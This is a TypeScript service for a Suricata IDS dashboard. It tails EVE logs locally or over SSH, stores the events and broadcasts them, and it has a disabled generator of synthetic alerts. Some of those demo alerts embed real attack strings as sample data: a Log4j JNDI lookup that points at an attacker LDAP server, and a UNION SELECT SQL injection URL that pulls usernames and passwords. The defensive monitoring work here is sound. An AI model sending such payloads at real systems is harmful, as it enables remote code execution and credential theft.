
import fs from 'node:fs';
import path from 'node:path';
import { spawn, type ChildProcessWithoutNullStreams } from 'node:child_process';

import type {
  IngestionStatus,
  NormalizedSecurityEvent,
  RawEveEvent,
} from '../types/index.ts';

import { ParserService } from './parserService.ts';
import { DatabaseService } from '../config/database.ts';
import { SocketService } from './socketService.ts';

type IngestionSource = 'suricata-tail' | 'demo-generator' | 'api-ingest';

export class SuricataReader {
  private static filePath =
    process.env.SURICATA_EVE_PATH || '/var/log/suricata/eve.json';

  private static resolvedPath = '';
  private static isRunning = false;
  private static isRemote = false;

  // Local-file reader state
  private static pollTimer: NodeJS.Timeout | null = null;
  private static currentOffset = 0;
  private static currentInode: number | null = null;
  private static leftoverBuffer = '';

  // Demo telemetry state
  private static demoTimer: NodeJS.Timeout | null = null;

  // Remote SSH reader state
  private static sshProcess: ChildProcessWithoutNullStreams | null = null;
  private static sshReconnectTimer: NodeJS.Timeout | null = null;
  private static remoteBuffer = '';
  private static remoteProcessingQueue: Promise<void> = Promise.resolve();

  private static status: IngestionStatus = {
    filePath: '',
    resolvedPath: '',
    active: false,
    fileExists: false,
    mode: 'live',
    bytesRead: 0,
    eventsReadCount: 0,
    alertsReadCount: 0,
    errorsCount: 0,
    lastEventTime: null,
    lastReadTime: null,
    lastError: null,
    deploymentMode: 'ids',
    enforcementVerified: false,
  };

  /**
   * Initialize the reader.
   *
   * If SURICATA_SSH_HOST and SURICATA_SSH_USER are configured,
   * follow the EVE log remotely over SSH. Otherwise, use local-file mode.
   */
  public static initialize(): void {
    if (this.isRunning) {
      console.warn('[SuricataReader] Reader is already running.');
      return;
    }

    const configuredPath =
      process.env.SURICATA_EVE_PATH || '/var/log/suricata/eve.json';

    const demoMode = process.env.DEMO_MODE === 'true';
    const sshHost = process.env.SURICATA_SSH_HOST?.trim();
    const sshUser = process.env.SURICATA_SSH_USER?.trim();

    this.filePath = configuredPath;
    this.isRemote = Boolean(sshHost && sshUser);

    this.resolvedPath = this.isRemote
      ? `${sshUser}@${sshHost}:${configuredPath}`
      : path.resolve(configuredPath);

    this.status.filePath = this.filePath;
    this.status.resolvedPath = this.resolvedPath;
    this.status.mode = demoMode ? 'demo' : 'live';
    this.status.fileExists = false;
    this.status.lastError = null;

    console.log(`[SuricataReader] Configured EVE path: ${this.resolvedPath}`);
    console.log(
      `[SuricataReader] Reader type: ${this.isRemote ? 'REMOTE SSH' : 'LOCAL FILE'}`
    );
    console.log(`[SuricataReader] Mode: ${this.status.mode.toUpperCase()}`);

    // Preserve existing baseline sample-data functionality.
    //void this.seedInitialSampleData();

    this.startReading();
    // Live-only mode: never generate synthetic demo telemetry.
    console.log(
      '[SuricataReader] Live-only mode enabled. Waiting for real Suricata events.'
    );

    // Never start demo telemetry merely because a remote Linux file
    // cannot be found on the Windows host.
    // if (
    //   demoMode ||
    //   (!this.isRemote && !fs.existsSync(this.resolvedPath))
    // ) {
    //   this.startDemoGenerator();
    // }
  }

  public static getStatus(): IngestionStatus {
    return { ...this.status };
  }

  /**
   * Load baseline sample data, if the sample file exists.
   */
  private static async seedInitialSampleData(): Promise<void> {
    const samplePath = path.resolve('sample-data/eve.json');

    if (!fs.existsSync(samplePath)) {
      return;
    }

    try {
      const content = fs.readFileSync(samplePath, 'utf8');
      const lines = content.split('\n').filter((line) => line.trim());

      console.log(
        `[SuricataReader] Loading ${lines.length} baseline EVE records...`
      );

      for (const line of lines) {
        const parsed = ParserService.parseJsonLine(line);

        if (!parsed.success || !parsed.data) {
          continue;
        }

        const normalized = ParserService.normalizeEvent(
          parsed.data,
          'demo-generator'
        );

        await DatabaseService.saveEvent(normalized);

        this.status.eventsReadCount++;

        if (normalized.eventType === 'alert') {
          this.status.alertsReadCount++;
        }
      }

      console.log('[SuricataReader] Baseline EVE records initialized.');
    } catch (err: unknown) {
      console.error(
        '[SuricataReader] Error seeding baseline data:',
        err instanceof Error ? err.message : String(err)
      );
    }
  }

  /**
   * Start either the remote SSH stream or local-file polling.
   */
  public static startReading(): void {
    if (this.isRunning) {
      return;
    }

    this.isRunning = true;
    this.status.active = true;

    if (this.isRemote) {
      this.startRemoteReading();
      SocketService.broadcastStatus(this.status);
      return;
    }

    void this.checkFileUpdate();

    this.pollTimer = setInterval(() => {
      void this.checkFileUpdate();
    }, 750);

    SocketService.broadcastStatus(this.status);
  }

  /**
   * Stop all readers, timers and child processes.
   */
  public static stopReading(): void {
    this.isRunning = false;
    this.status.active = false;

    if (this.pollTimer) {
      clearInterval(this.pollTimer);
      this.pollTimer = null;
    }

    if (this.demoTimer) {
      clearInterval(this.demoTimer);
      this.demoTimer = null;
    }

    if (this.sshReconnectTimer) {
      clearTimeout(this.sshReconnectTimer);
      this.sshReconnectTimer = null;
    }

    if (this.sshProcess) {
      const child = this.sshProcess;
      this.sshProcess = null;
      child.kill();
    }

    this.remoteBuffer = '';
    SocketService.broadcastStatus(this.status);

    console.log('[SuricataReader] Reader stopped.');
  }

  /**
   * Start an SSH subprocess that follows new EVE log entries on Ubuntu.
   */
  private static startRemoteReading(): void {
    if (!this.isRunning || this.sshProcess) {
      return;
    }

    const host = process.env.SURICATA_SSH_HOST?.trim();
    const user = process.env.SURICATA_SSH_USER?.trim();
    const keyPath = process.env.SURICATA_SSH_KEY_PATH?.trim();
    const remotePath =
      process.env.SURICATA_EVE_PATH || '/var/log/suricata/eve.json';

    if (!host || !user || !keyPath) {
      this.setReaderError(
        'Remote configuration is incomplete. Set SURICATA_SSH_HOST, SURICATA_SSH_USER and SURICATA_SSH_KEY_PATH.'
      );
      this.scheduleRemoteReconnect();
      return;
    }

    // Quote the path for the remote Ubuntu shell.
    const quotedRemotePath =
      "'" + remotePath.replace(/'/g, "'\\''") + "'";

    const remoteCommand = `tail -n 0 -F ${quotedRemotePath}`;

    console.log(
      `[SuricataReader] Starting SSH stream: ${user}@${host}`
    );

    try {
      const child = spawn(
        'ssh',
        [
          '-i',
          keyPath,
          '-o',
          'BatchMode=yes',
          '-o',
          'IdentitiesOnly=yes',
          '-o',
          'StrictHostKeyChecking=yes',
          '-o',
          'ConnectTimeout=10',
          '-o',
          'ServerAliveInterval=30',
          '-o',
          'ServerAliveCountMax=3',
          `${user}@${host}`,
          remoteCommand,
        ],
        {
          windowsHide: true,
          // All three streams are piped to satisfy the child-process type.
          stdio: ['pipe', 'pipe', 'pipe'],
        }
      );

      this.sshProcess = child;
      this.remoteBuffer = '';

      child.stdout.setEncoding('utf8');

      child.stdout.on('data', (chunk: string | Buffer) => {
        if (!this.isRunning) {
          return;
        }

        const chunkText = String(chunk);
        const raw = this.remoteBuffer + chunkText;
        const lines = raw.split('\n');

        // Hold any incomplete JSON line until the next chunk arrives.
        this.remoteBuffer = lines.pop() ?? '';

        for (const line of lines) {
          if (!line.trim()) {
            continue;
          }

          this.status.fileExists = true;
          this.status.bytesRead += Buffer.byteLength(line, 'utf8') + 1;
          this.status.lastReadTime = new Date().toISOString();

          // Queue processing so database writes happen in stream order.
          this.remoteProcessingQueue = this.remoteProcessingQueue
            .then(async () => {
              if (this.isRunning) {
                await this.processSingleLine(line, 'suricata-tail');
              }
            })
            .catch((err: unknown) => {
              this.setReaderError(
                `Remote event processing failed: ${
                  err instanceof Error ? err.message : String(err)
                }`
              );
            });
        }
      });

      child.stderr.setEncoding('utf8');

      child.stderr.on('data', (chunk: string | Buffer) => {
        const message = String(chunk).trim();

        if (message) {
          console.warn(`[SuricataReader][SSH] ${message}`);
        }
      });

      child.on('error', (err: Error) => {
        this.setReaderError(`SSH process error: ${err.message}`);
      });

      child.on('close', (code, signal) => {
        if (this.sshProcess === child) {
          this.sshProcess = null;
        }

        console.warn(
          `[SuricataReader] SSH stream closed (code=${code}, signal=${signal}).`
        );

        this.status.fileExists = false;
        this.remoteBuffer = '';

        SocketService.broadcastStatus(this.status);

        if (this.isRunning) {
          this.scheduleRemoteReconnect();
        }
      });
    } catch (err: unknown) {
      this.setReaderError(
        `Could not start SSH: ${
          err instanceof Error ? err.message : String(err)
        }`
      );

      this.scheduleRemoteReconnect();
    }
  }

  /**
   * Retry the remote SSH stream after a temporary failure.
   */
  private static scheduleRemoteReconnect(): void {
    if (!this.isRunning || this.sshReconnectTimer) {
      return;
    }

    this.sshReconnectTimer = setTimeout(() => {
      this.sshReconnectTimer = null;
      this.startRemoteReading();
    }, 5000);
  }

  /**
   * Update error status consistently.
   */
  private static setReaderError(message: string): void {
    this.status.errorsCount++;
    this.status.lastError = message;

    console.error(`[SuricataReader] ${message}`);
    SocketService.broadcastStatus(this.status);
  }

  /**
   * Poll the local EVE file. Used only when remote SSH mode is disabled.
   */
  private static async checkFileUpdate(): Promise<void> {
    try {
      if (!this.isRunning || this.isRemote) {
        return;
      }

      if (!fs.existsSync(this.resolvedPath)) {
        if (this.status.fileExists) {
          console.warn(
            `[SuricataReader] File disappeared: ${this.resolvedPath}`
          );

          this.status.fileExists = false;
          this.currentOffset = 0;
          this.currentInode = null;
          this.leftoverBuffer = '';

          SocketService.broadcastStatus(this.status);
        }

        return;
      }

      this.status.fileExists = true;

      const stat = fs.statSync(this.resolvedPath);

      // Detect log rotation or truncation.
      if (
        stat.size < this.currentOffset ||
        (this.currentInode !== null && stat.ino !== this.currentInode)
      ) {
        console.log(
          '[SuricataReader] Log rotation detected; resetting read position.'
        );

        this.currentOffset = 0;
        this.currentInode = stat.ino;
        this.leftoverBuffer = '';
      } else if (this.currentInode === null) {
        this.currentInode = stat.ino;
      }

      if (stat.size <= this.currentOffset) {
        return;
      }

      const bytesToRead = stat.size - this.currentOffset;
      const buffer = Buffer.alloc(bytesToRead);

      let fd: number | null = null;

      try {
        fd = fs.openSync(this.resolvedPath, 'r');

        const bytesRead = fs.readSync(
          fd,
          buffer,
          0,
          bytesToRead,
          this.currentOffset
        );

        this.currentOffset += bytesRead;
        this.status.bytesRead += bytesRead;
        this.status.lastReadTime = new Date().toISOString();

        const rawChunk =
          this.leftoverBuffer + buffer.subarray(0, bytesRead).toString('utf8');

        const lines = rawChunk.split('\n');
        this.leftoverBuffer = lines.pop() ?? '';

        for (const line of lines) {
          if (!line.trim()) {
            continue;
          }

          await this.processSingleLine(line, 'suricata-tail');
        }
      } finally {
        if (fd !== null) {
          fs.closeSync(fd);
        }
      }
    } catch (err: unknown) {
      this.setReaderError(
        `Local file read error: ${
          err instanceof Error ? err.message : String(err)
        }`
      );
    }
  }

  /**
   * Parse, normalize, persist and broadcast one EVE JSON record.
   */
  public static async processSingleLine(
    line: string,
    source: IngestionSource = 'suricata-tail'
  ): Promise<NormalizedSecurityEvent | null> {
    const parsed = ParserService.parseJsonLine(line);

    if (!parsed.success || !parsed.data) {
      this.status.errorsCount++;
      this.status.lastError = parsed.error || 'Failed to parse JSON line';
      return null;
    }

    try {
      const normalized = ParserService.normalizeEvent(parsed.data, source);
      const { event, isNew } = await DatabaseService.saveEvent(normalized);

      this.status.eventsReadCount++;
      this.status.lastEventTime = event.timestamp;

      if (event.eventType === 'alert') {
        this.status.alertsReadCount++;
      }

      if (event.action === 'DROP' || event.action === 'REJECT') {
        this.status.deploymentMode = 'ips';
        this.status.enforcementVerified = true;
      }

      if (isNew) {
        SocketService.broadcastEvent(event);
      }

      SocketService.broadcastStatus(this.status);

      return event;
    } catch (err: unknown) {
      this.setReaderError(
        `Event ingestion failed: ${
          err instanceof Error ? err.message : String(err)
        }`
      );

      return null;
    }
  }

  /**
   * Generate simulated events only when demo mode is enabled or the
   * local log file is unavailable.
   */
  private static startDemoGenerator(): void {
    if (this.demoTimer) {
      return;
    }

    console.warn(
      '[SuricataReader] Simulated telemetry is enabled; these are not live detections.'
    );

    let counter = 0;

    const scenarios = [
      'kali-nmap',
      'kali-log4j',
      'kali-sqli',
      'kali-ssh-brute',
      'malware-c2',
      'flow-telemetry',
      'dns-telemetry',
      'ips-drop-scenario',
    ];

    this.demoTimer = setInterval(() => {
      if (!this.isRunning) {
        return;
      }

      const scenario = scenarios[counter % scenarios.length];
      counter++;

      void this.generateSimulatedTraffic(scenario).catch((err: unknown) => {
        console.error(
          '[SuricataReader] Demo generation error:',
          err instanceof Error ? err.message : String(err)
        );
      });
    }, 12000);
  }

  /**
   * Generate simulated events for lab demonstration.
   * These records are synthetic and must not be treated as real detections.
   */
  public static async generateSimulatedTraffic(
    scenario: string
  ): Promise<NormalizedSecurityEvent[]> {
    const now = new Date().toISOString();
    const generated: NormalizedSecurityEvent[] = [];

    const attackers = [
      '192.168.1.105',
      '10.10.14.3',
      '198.51.100.42',
      '203.0.113.19',
      '172.16.5.99',
    ];

    const attackerIp =
      attackers[Math.floor(Math.random() * attackers.length)];

    const targetIp = '192.168.1.50';
    const randomPort = () => 40000 + Math.floor(Math.random() * 20000);
    const randomFlowId = () => Math.floor(Math.random() * 9000000000);

    const makeAlert = (
      signatureId: number,
      signature: string,
      category: string,
      severity: number,
      destPort: number,
      protocol = 'TCP',
      extra: Partial<RawEveEvent> = {}
    ): RawEveEvent => ({
      timestamp: now,
      flow_id: randomFlowId(),
      in_iface: 'eth0',
      event_type: 'alert',
      src_ip: attackerIp,
      src_port: randomPort(),
      dest_ip: targetIp,
      dest_port: destPort,
      proto: protocol,
      alert: {
        action: 'allowed',
        gid: 1,
        signature_id: signatureId,
        rev: 1,
        signature,
        category,
        severity,
      },
      ...extra,
    });

    let rawEvents: RawEveEvent[] = [];

    switch (scenario) {
      case 'kali-nmap':
        rawEvents = [
          makeAlert(
            2010935,
            'ET SCAN Nmap Scripting Engine User-Agent Detected',
            'Attempted Information Leak',
            3,
            80,
            'TCP',
            {
              http: {
                hostname: targetIp,
                url: '/',
                http_user_agent:
                  'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
                http_method: 'GET',
                protocol: 'HTTP/1.1',
                status: 200,
              },
              app_proto: 'http',
            }
          ),
          {
            timestamp: now,
            flow_id: randomFlowId(),
            in_iface: 'eth0',
            event_type: 'flow',
            src_ip: attackerIp,
            src_port: randomPort(),
            dest_ip: targetIp,
            dest_port: 80,
            proto: 'TCP',
            app_proto: 'http',
          },
        ];
        break;

      case 'kali-log4j':
        rawEvents = [
          makeAlert(
            2014757,
            'ET EXPLOIT Apache Log4j JNDI RCE Attempt (CVE-2021-44228)',
            'Attempted Administrator Privilege Gain',
            1,
            8080,
            'TCP',
            {
              http: {
                hostname: `${targetIp}:8080`,
                url: '/api/v1/auth',
                http_user_agent: `\${jndi:ldap://${attackerIp}:1389/Exploit}`,
                http_method: 'POST',
                protocol: 'HTTP/1.1',
                status: 400,
              },
              app_proto: 'http',
            }
          ),
        ];
        break;

      case 'kali-sqli':
        rawEvents = [
          makeAlert(
            2006443,
            'ET WEB_SPECIFIC_APPS SQL Injection Attempt (UNION SELECT in URI)',
            'Web Application Attack',
            1,
            80,
            'TCP',
            {
              http: {
                hostname: targetIp,
                url: '/products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--',
                http_method: 'GET',
                protocol: 'HTTP/1.1',
                status: 500,
              },
              app_proto: 'http',
            }
          ),
        ];
        break;

      case 'kali-ssh-brute':
        rawEvents = [
          makeAlert(
            2001219,
            'ET SCAN Potential SSH Scan OUTBOUND / Brute Force Attempt',
            'Attempted Information Leak',
            2,
            22,
            'TCP',
            { app_proto: 'ssh' }
          ),
        ];
        break;

      case 'malware-c2':
        rawEvents = [
          {
            timestamp: now,
            flow_id: randomFlowId(),
            in_iface: 'eth0',
            event_type: 'alert',
            src_ip: targetIp,
            src_port: randomPort(),
            dest_ip: '198.51.100.88',
            dest_port: 443,
            proto: 'TCP',
            alert: {
              action: 'allowed',
              gid: 1,
              signature_id: 2024891,
              rev: 2,
              signature:
                'ET MALWARE Cobalt Strike Beacon Observed via TLS SNI',
              category: 'A Network Trojan was detected',
              severity: 1,
            },
            tls: {
              sni: 'updates.security-cdn.net',
              version: 'TLSv1.3',
              subject: 'CN=updates.security-cdn.net',
            },
            app_proto: 'tls',
          },
        ];
        break;

      case 'ips-drop-scenario':
        rawEvents = [
          {
            timestamp: now,
            flow_id: randomFlowId(),
            in_iface: 'eth0',
            event_type: 'alert',
            src_ip: attackerIp,
            src_port: randomPort(),
            dest_ip: targetIp,
            dest_port: 445,
            proto: 'TCP',
            alert: {
              action: 'blocked',
              gid: 1,
              signature_id: 2024217,
              rev: 2,
              signature:
                'ET EXPLOIT MS17-010 EternalBlue SMB Remote Code Execution [BLOCKED INLINE]',
              category: 'Attempted Administrator Privilege Gain',
              severity: 1,
            },
            verdict: 'drop',
            app_proto: 'smb',
          },
        ];
        break;

      case 'dns-telemetry':
        rawEvents = [
          {
            timestamp: now,
            flow_id: randomFlowId(),
            in_iface: 'eth0',
            event_type: 'dns',
            src_ip: targetIp,
            src_port: randomPort(),
            dest_ip: '8.8.8.8',
            dest_port: 53,
            proto: 'UDP',
            dns: {
              type: 'query',
              id: Math.floor(Math.random() * 65000),
              rrname: 'updates.security-cdn.net',
              rrtype: 'A',
            },
            app_proto: 'dns',
          },
        ];
        break;

      default:
        rawEvents = [
          {
            timestamp: now,
            flow_id: randomFlowId(),
            in_iface: 'eth0',
            event_type: 'flow',
            src_ip: '192.168.1.100',
            src_port: randomPort(),
            dest_ip: targetIp,
            dest_port: 80,
            proto: 'TCP',
            app_proto: 'http',
          },
        ];
        break;
    }

    for (const raw of rawEvents) {
      const normalized = ParserService.normalizeEvent(raw, 'demo-generator');
      const { event, isNew } = await DatabaseService.saveEvent(normalized);

      if (isNew) {
        SocketService.broadcastEvent(event);
        generated.push(event);
      }
    }

    return generated;
  }
}
